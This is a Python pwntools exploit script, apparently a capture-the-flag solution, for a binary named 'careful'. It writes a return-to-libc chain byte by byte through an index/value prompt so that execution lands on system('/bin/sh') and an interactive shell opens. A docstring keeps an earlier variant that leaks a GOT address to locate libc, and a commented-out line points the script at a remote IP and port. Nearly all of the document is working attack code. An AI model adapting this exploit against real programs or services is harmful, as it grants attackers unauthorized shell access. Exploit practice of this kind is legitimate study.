from pwn import *
from ctypes import *

p=process('./careful')
# p=remote('106.75.32.79',10000)

# popret='080483a1'
# printf='080483c0'
# fflush='080483d0'
# system='080483e0'
# print_got='0804a00c'
# begin='0804852D'
# out='08048563'

system='080483e0'
sh='0804828e'

def w(index,value):
	p.recvuntil('index:') 
	p.sendline(str(index))
	p.recvuntil('value:')
	value='0A0A0A'+value
	c=c_int32(int(value,16)).value
	p.sendline(str(c))

def reset():
	w(28,'00')

def end():
	w(28,'11')

def wdword(index,word):
	w(index,word[6:])
	w(index+1,word[4:6])
	w(index+2,word[2:4])
	w(index+3,word[0:2])
	reset()

def main():
	"""
	# write print addr
	wdword(44,printf)
	wdword(48,popret)
	wdword(52,print_got)
	wdword(56,begin)
	# wdword(60,popret)
	# wdword(64,out)
	# wdword(68,begin)
	# gdb.attach(p,'b *0x8048604')
	end()

	recv=p.recv(4)

	sys_addr=u32(recv.ljust(4,'\x00'))
	print 'system addr: '+hex(sys_addr)
	sh_addr=sys_addr-0x4cbd0+0x15d1a9
	print '/bin/sh addr: '+hex(sh_addr)

	# gdb.attach(p,'b *0x08048604')
	p.sendline('28')
	p.recvuntil('value:')
        value='0A0A0A00'
        c=c_int32(int(value,16)).value
	p.sendline(str(c))

	wdword(44,system)
	wdword(52,hex(sh_addr)[2:])
	end()
	# gdb.attach(p,'b *0x8048604')
	p.interactive()
	"""
	wdword(44,system)
	wdword(52,sh)
	end()
	p.interactive()

main()
